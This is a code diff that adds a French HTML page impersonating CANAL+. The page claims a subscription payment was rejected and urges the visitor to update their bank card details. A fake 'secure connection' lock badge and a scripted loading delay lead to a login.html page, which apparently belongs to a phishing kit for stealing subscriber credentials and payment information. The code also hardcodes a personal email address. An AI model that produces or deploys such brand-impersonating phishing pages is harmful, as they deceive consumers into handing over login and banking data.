@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CANAL+ - Information Importante</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Open Sans', 'Segoe UI', Arial, sans-serif;
+    }
+    
+    body {
+      background-color: #ffffff;
+      color: #000000;
+      line-height: 1.5;
+      position: relative;
+    }
+    
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 5px;
+      background: linear-gradient(90deg, #ec3654, #ff6b6b);
+      z-index: 1000;
+    }
+    
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 16px 20px;
+      border-bottom: 1px solid #e0e0e0;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+      position: relative;
+    }
+    
+    .logo {
+      height: 30px;
+      transition: transform 0.3s ease;
+    }
+    
+    .logo:hover {
+      transform: scale(1.05);
+    }
+    
+    .secure-connection {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      color: #999;
+      transition: color 0.3s ease;
+    }
+    
+    .secure-connection:hover {
+      color: #666;
+    }
+    
+    .secure-connection i {
+      margin-right: 5px;
+      font-size: 16px;
+    }
+    
+    .lock-icon {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      background-color: #999;
+      -webkit-mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24'%3E%3Cpath d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z'/%3E%3C/svg%3E") no-repeat 50% 50%;
+      mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24'%3E%3Cpath d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z'/%3E%3C/svg%3E") no-repeat 50% 50%;
+      margin-right: 8px;
+      transition: background-color 0.3s ease;
+    }
+    
+    .secure-connection:hover .lock-icon {
+      background-color: #666;
+    }
+    
+    .container {
+      max-width: 800px;
+      margin: 40px auto;
+      padding: 0 20px;
+      animation: fadeIn 0.5s ease-out;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    h1 {
+      font-size: 22px;
+      text-align: center;
+      margin-bottom: 30px;
+      text-transform: uppercase;
+      font-weight: 700;
+      font-style: italic;
+      letter-spacing: 0.5px;
+      position: relative;
+    }
+    
+    .message {
+      text-align: center;
+      margin-bottom: 40px;
+      color: #333;
+      font-size: 16px;
+      line-height: 1.6;
+    }
+    
+    .email-box {
+      background-color: #f5f5f5;
+      padding: 12px 15px;
+      border-radius: 3px;
+      text-align: center;
+      margin: 30px auto;
+      font-size: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      max-width: 400px;
+      border: 1px solid #e0e0e0;
+    }
+    
+    .email-box i {
+      color: #0077cc;
+      margin-right: 10px;
+      font-size: 18px;
+    }
+    
+    .rejection-box {
+      position: relative;
+      background-color: #fff8f8;
+      border-left: 3px solid #ec3654;
+      padding: 25px;
+      margin: 30px 0;
+      border-radius: 3px;
+    }
+    
+    .rejection-title {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+      font-weight: bold;
+      font-size: 16px;
+      color: #ec3654;
+    }
+    
+    .rejection-icon {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      color: #fff;
+      background-color: #ec3654;
+      border-radius: 50%;
+      margin-right: 10px;
+      position: relative;
+    }
+    
+    .rejection-icon::before {
+      content: "!";
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: white;
+      font-weight: bold;
+      font-size: 12px;
+    }
+    
+    .rejection-content {
+      color: #333;
+      line-height: 1.6;
+      font-size: 15px;
+    }
+    
+    .actions-section {
+      margin: 40px 0;
+    }
+    
+    .actions-title {
+      font-size: 17px;
+      margin-bottom: 20px;
+      font-weight: 600;
+      color: #333;
+    }
+    
+    .action-item {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+      padding: 10px 0;
+      transition: transform 0.3s ease;
+    }
+    
+    .action-item:hover {
+      transform: translateX(5px);
+    }
+    
+    .arrow-icon {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      background-color: #3fa9f5;
+      -webkit-mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath d='M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z'/%3E%3C/svg%3E") no-repeat 50% 50%;
+      mask: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath d='M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z'/%3E%3C/svg%3E") no-repeat 50% 50%;
+      margin-right: 15px;
+    }
+    
+    .action-item span {
+      color: #333;
+      font-size: 15px;
+    }
+    
+    .important-note {
+      background-color: #f5f5f5;
+      padding: 20px;
+      border-radius: 3px;
+      margin-bottom: 40px;
+      border-left: 3px solid #333;
+    }
+    
+    .important-note strong {
+      font-weight: bold;
+      display: block;
+      margin-bottom: 10px;
+      color: #333;
+    }
+    
+    .important-note p {
+      color: #333;
+      line-height: 1.6;
+      font-size: 15px;
+    }
+    
+    .button-container {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 30px;
+    }
+    
+    .btn {
+      padding: 12px 24px;
+      border-radius: 3px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      text-align: center;
+      border: none;
+      transition: all 0.3s ease;
+    }
+    
+    .btn-secondary {
+      background-color: #e0e0e0;
+      color: #333;
+      min-width: 150px;
+    }
+    
+    .btn-secondary:hover {
+      background-color: #d0d0d0;
+    }
+    
+    .btn-primary {
+      background-color: #ec3654;
+      color: white;
+      min-width: 150px;
+      text-transform: uppercase;
+    }
+    
+    .btn-primary:hover {
+      background-color: #d72944;
+    }
+    
+    /* Overlay de chargement */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.9);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s ease, visibility 0.3s ease;
+    }
+    
+    .loading-overlay.show {
+      opacity: 1;
+      visibility: visible;
+    }
+    
+    .loader {
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #ec3654;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    
+    .loading-text {
+      color: #333;
+      font-size: 16px;
+      text-align: center;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    @media (max-width: 768px) {
+      .container {
+        padding: 0 15px;
+      }
+      
+      h1 {
+        font-size: 20px;
+      }
+      
+      .button-container {
+        flex-direction: column;
+        gap: 15px;
+      }
+      
+      .btn {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="logo_canal.jpg" alt="CANAL+" class="logo">
+    <div class="secure-connection">
+      <span class="lock-icon"></span>
+      Connexion sécurisée
+    </div>
+  </header>
+  
+  <div class="container">
+    <h1>Information Importante</h1>
+    
+    <div class="message">
+      Nous avons détecté un problème avec votre dernier paiement qui nécessite votre attention.
+    </div>
+    
+    <div class="email-box">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="#0077cc" style="margin-right: 10px;">
+        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8l8 5 8-5v10zm-8-7L4 6h16l-8 5z"/>
+      </svg>
+      <span id="userEmail">milou.vbv@gmail.com</span>
+    </div>
+    
+    <div class="rejection-box">
+      <div class="rejection-title">
+        <span class="rejection-icon"></span>
+        Prélèvement rejeté
+      </div>
+      <div class="rejection-content">
+        Nous avons constaté que votre dernier prélèvement pour votre abonnement CANAL+ a été rejeté. Afin de continuer à profiter de vos services sans interruption, nous vous invitons à mettre à jour vos informations de paiement dans les plus brefs délais.
+      </div>
+    </div>
+    
+    <div class="actions-section">
+      <div class="actions-title">Que devez-vous faire ?</div>
+      
+      <div class="action-item">
+        <span class="arrow-icon"></span>
+        <span>Vérifiez les informations de votre carte bancaire</span>
+      </div>
+      
+      <div class="action-item">
+        <span class="arrow-icon"></span>
+        <span>Assurez-vous que votre carte n'est pas expirée</span>
+      </div>
+      
+      <div class="action-item">
+        <span class="arrow-icon"></span>
+        <span>Vérifiez que votre compte bancaire est suffisamment approvisionné</span>
+      </div>
+    </div>
+    
+    <div class="important-note">
+      <strong>Important :</strong>
+      <p>Pour éviter toute interruption de service, nous vous recommandons de mettre à jour vos informations de paiement dès que possible. Votre accès aux contenus CANAL+ pourrait être suspendu si le problème persiste.</p>
+    </div>
+    
+    <div class="button-container">
+      <button class="btn btn-secondary" id="backButton">Retour</button>
+      <button class="btn btn-primary" id="updateButton">METTRE À JOUR</button>
+    </div>
+  </div>
+  
+  <!-- Overlay de chargement -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loader"></div>
+    <div class="loading-text">Chargement en cours...</div>
+  </div>
+  
+  <script>
+    // Récupérer l'email depuis sessionStorage si disponible
+    document.addEventListener('DOMContentLoaded', function() {
+      const storedEmail = sessionStorage.getItem('userEmail');
+      if (storedEmail) {
+        document.getElementById('userEmail').textContent = storedEmail;
+      }
+      
+      // Ajouter les gestionnaires d'événements pour les boutons
+      document.getElementById('backButton').addEventListener('click', function() {
+        window.history.back();
+      });
+      
+      document.getElementById('updateButton').addEventListener('click', function() {
+        // Afficher l'overlay de chargement
+        document.getElementById('loadingOverlay').classList.add('show');
+        
+        // Rediriger après un délai de 2 secondes pour simuler un chargement
+        setTimeout(function() {
+          window.location.href = 'login.html';
+        }, 2000);
+      });
+    });
+  </script>
+</body>
+</html>
